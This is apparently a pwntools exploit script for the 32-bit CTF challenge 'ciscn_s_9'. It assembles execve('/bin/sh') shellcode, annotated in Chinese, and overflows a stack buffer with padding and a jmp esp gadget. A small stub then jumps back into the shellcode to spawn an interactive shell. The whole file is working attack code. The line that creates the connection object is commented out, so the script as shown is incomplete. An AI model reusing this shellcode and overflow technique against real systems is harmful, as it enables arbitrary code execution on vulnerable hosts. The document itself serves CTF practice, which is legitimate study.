from pwn import *

context.os = "Linux"
context.arch = "i386"
context.log_level = "debug"

# if args.REMOTE:
#     p = remote('node4.buuoj.cn', 29244)
# else:
#     context.terminal = ['tmux', 'splitw', '-h']
#     p = process('./ciscn_s_9')
#     gdb.attach(p)

jmp_esp = 0x8048554
hint = 0x8048551
offset = 0x20


# 23 bytes shellcode
shellcode ='''
xor eax,eax             #eax置0
xor edx,edx				#edx置0
push edx				#将0入栈，标记了”/bin/sh”的结尾
push 0x68732f2f         #传递”/sh”，为了4字节对齐，使用//sh，这在execve()中等同于/sh
push 0x6e69622f         #传递“/bin”
mov ebx,esp             #此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx
xor ecx,ecx
mov al,0xB              #eax置为execve函数的中断号
int 0x80                #调用软中断
'''
shellcode=asm(shellcode)
# print(shellcode)
# print(disasm(shellcode))

# 25 bytes shellcode
# shellcode2 = b'\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'
# print(disasm(shellcode2))

pld = shellcode.ljust(0x20, b'\x00')
pld += p32(0xdeadbeef)
pld += p32(jmp_esp)
pld += asm("sub esp, 40; call esp")

p.sendafter(b'>\n', pld)

p.interactive()